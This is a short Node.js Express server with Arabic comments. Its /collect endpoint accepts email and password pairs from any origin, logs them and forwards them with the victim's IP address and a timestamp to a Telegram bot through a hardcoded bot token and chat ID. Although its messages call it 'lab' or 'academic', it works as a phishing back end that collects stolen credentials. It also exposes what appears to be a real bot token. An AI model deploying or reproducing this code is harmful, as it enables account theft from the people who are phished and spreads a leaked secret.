const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// السماح بطلبات CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});
app.use(express.json({ limit: '10mb' }));

// ===== بيانات التيليجرام الخاصة بك (تم إدخالها مسبقاً) =====
const BOT_TOKEN = '8987828980:AAE6eC_Q4GAjuqkwLDjrFYUgF8WFZQKOUXo';
const CHAT_ID = '7689104513';

// ===== نقطة الاستقبال =====
app.post('/collect', async (req, res) => {
    const { email, password } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
    const now = new Date();
    const formattedTime = now.toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });

    console.log(`[${now.toISOString()}] تم استقبال: ${email} | ${password} | IP: ${clientIP}`);

    // رسالة التيليجرام مع الوقت والتاريخ
    const message = `📩 **بيانات تم جمعها في المعمل**\n\n👤 البريد: ${email}\n🔑 كلمة المرور: ${password}\n🌐 IP: ${clientIP}\n🕒 الوقت والتاريخ: ${formattedTime}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            console.error('فشل الإرسال:', await response.text());
        } else {
            console.log('✅ تم الإرسال بنجاح');
        }
    } catch (error) {
        console.error('خطأ في الاتصال:', error.message);
    }

    res.status(200).json({ status: 'تم الاستلام' });
});

app.listen(PORT, () => {
    console.log(`🚀 الخادم الأكاديمي يعمل على http://localhost:${PORT}`);
});
